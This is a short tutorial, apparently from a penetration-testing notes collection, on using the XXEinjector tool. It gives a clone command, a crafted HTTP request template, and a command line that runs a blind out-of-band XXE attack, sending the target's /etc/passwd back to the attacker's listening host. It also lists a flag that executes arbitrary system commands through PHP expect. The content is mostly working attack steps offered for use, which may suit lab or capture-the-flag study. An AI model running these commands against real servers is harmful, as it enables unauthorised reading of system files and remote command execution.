# [XXEInjector](https://github.com/enjoiz/XXEinjector)
***
#### XXE injector is a tool that can be used to automate the process of XXE injection , such as basic XXE , CDATA source exfiltration, error-based XXE, and blind OOB XXE.

#### First clone the tool to our machine:
```bash
$ git clone https://github.com/enjoiz/XXEinjector.git
```

#### Then we copy the HTTP request from Burp and write it to a file , without including the full XML data, and write `XXEINJECT` after it:
```http request
POST /vulnerable/leet.php HTTP/1.1
Host: 12.34.56.78
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://12.34.56.78
Referer: http://12.34.56.78/vulnerable/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

#### Finally, we can run the tool to perform a blind OOB XXE:
```bash
$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=81 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

#### As we are base64 encoding the data, it won't be printed , so in order to get the exfiltrated data we should check the `Logs` folder under the tool:
```bash
cat Logs/12.34.56.78/etc/passwd.log 
```

### Useful flags:
* `--host` = Our IP
* `--httpport` = Our Port
* `--file` = File with the request
* `--path` = File we want to read
* `--oob=http` = Perform OOB attack
* `--phpfilter` = Add php filter (base64)
* `--direct` = Direct exploitation
* `--expect` = Use PHP expect extension to execute arbitrary sys command

